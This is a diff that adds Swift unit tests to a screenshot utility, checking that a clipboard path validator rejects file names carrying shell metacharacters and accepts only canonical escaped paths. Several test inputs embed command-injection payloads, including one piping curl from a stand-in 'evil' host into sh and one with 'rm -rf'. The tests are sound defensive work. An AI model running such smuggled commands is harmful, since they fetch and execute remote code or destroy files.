@@ -473,6 +473,47 @@ final class HotshotCoreTests: XCTestCase {
             "\(home)/shots/hotshot-1.png")
     }
 
+    func testTrustedEnrichedClipboardPathRejectsForeignHotshotNames() {
+        // screenshotSavePath only ever writes digits and hyphens between
+        // "hotshot-" and ".png". A foreign file with a metacharacter in its
+        // name is not ours, even when it exists in the right folder.
+        for name in [
+            "hotshot-$(curl evil|sh).png", "hotshot-`id`.png", "hotshot-a;rm -rf x.png",
+            "hotshot-!!.png", "hotshot-20260930-120000-123 x.png", "hotshot-.png",
+        ] {
+            XCTAssertNil(
+                trustedEnrichedClipboardPath("/d/\(name)", screenshotDirectory: "/d") { _ in
+                    true
+                }, name)
+        }
+        XCTAssertFalse(isHotshotSavedFileName("hotshot-$(id).png"))
+        XCTAssertFalse(isHotshotSavedFileName("hotshot-.png"))
+        XCTAssertFalse(isHotshotSavedFileName("hotshot-١.png"))
+        XCTAssertTrue(isHotshotSavedFileName("hotshot-20260930-120000-123.png"))
+        XCTAssertTrue(isHotshotSavedFileName("hotshot-20260930-120000-123-2.png"))
+    }
+
+    func testTrustedEnrichedClipboardPathRequiresCanonicalEscapedForm() {
+        // writePasteboard stores shellEscapedPath(path); text in any other
+        // form was not written by hotshot. The unescaped spelling of a path
+        // whose directory needs escaping must not be trusted ...
+        XCTAssertNil(
+            trustedEnrichedClipboardPath(
+                "/Users/me/My Shots/hotshot-1.png", screenshotDirectory: "/Users/me/My Shots"
+            ) { _ in true })
+        // ... nor a spelling with extra, non-canonical backslashes.
+        XCTAssertNil(
+            trustedEnrichedClipboardPath("\\/d\\/hotshot-1.png", screenshotDirectory: "/d") { _ in
+                true
+            })
+        // The canonical form is still accepted.
+        XCTAssertEqual(
+            trustedEnrichedClipboardPath(
+                "/Users/me/My\\ Shots/hotshot-1.png", screenshotDirectory: "/Users/me/My Shots"
+            ) { _ in true },
+            "/Users/me/My\\ Shots/hotshot-1.png")
+    }
+
     func testUserDefaultFallsBackToDefaultValueWhenUnset() {
         let key = "test.UserDefault.\(UUID().uuidString)"
         addTeardownBlock { UserDefaults.standard.removeObject(forKey: key) }
